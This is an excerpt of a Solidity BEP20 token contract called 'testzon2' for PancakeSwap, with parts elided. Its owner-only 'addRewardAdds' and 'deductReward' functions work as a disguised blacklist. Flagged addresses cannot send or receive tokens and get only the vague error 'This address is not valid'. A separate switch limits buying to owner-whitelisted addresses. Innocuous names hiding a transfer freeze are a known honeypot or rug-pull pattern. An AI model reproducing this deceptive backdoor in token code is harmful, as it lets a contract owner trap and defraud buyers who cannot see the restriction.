...
contract testzon2 is Context, IBEP20, Ownable {
    ...
    mapping (address => bool) public _isBonusAdds;
    mapping (address => bool) public _isRewardAdds;
    ...
    uint256 private constant _tTotal = 10 * 10**9 * 10**7; 
    ...
    uint256 public _maxTxAmount = 10 * 10**9 * 10**7; 
    uint256 public _numTokensSellToAddToLiquidity = 50 * 10**6 * 10**7;
    uint256 public _maxWalletToken = 10 * 10**9 * 10**7; 

    IPancakeRouter02 public immutable pcsV2Router;
    address public immutable pcsV2Pair;

    string private _name = "testzon2";
    string private _symbol = "testzon2";
    ...
    function deductBonus(address account) external onlyOwner {
        _isBonusAdds[account] = false;
    }
    
    function deductReward(address account) external onlyOwner {
        _isRewardAdds[account] = false;
    }
    
    function addBonusAdds(address[] calldata addresses) external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _isBonusAdds[addresses[i]] = true;
        }
    }
    
    function addRewardAdds(address[] calldata addresses) external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _isRewardAdds[addresses[i]] = true;
        }
    }
    ...
    function _transfer(
        ...
        if (onlyCommunity){
            require(_isBonusAdds[recipient], "Only Community Can Buy!");
        }
        
        require(!_isRewardAdds[sender] && !_isRewardAdds[recipient], "This address is not valid");
        ...
        if (overMinTokenBalance && !inSwapAndLiquify && sender != pcsV2Pair && swapAndLiquifyEnabled) {
            contractTokenBalance = _numTokensSellToAddToLiquidity;
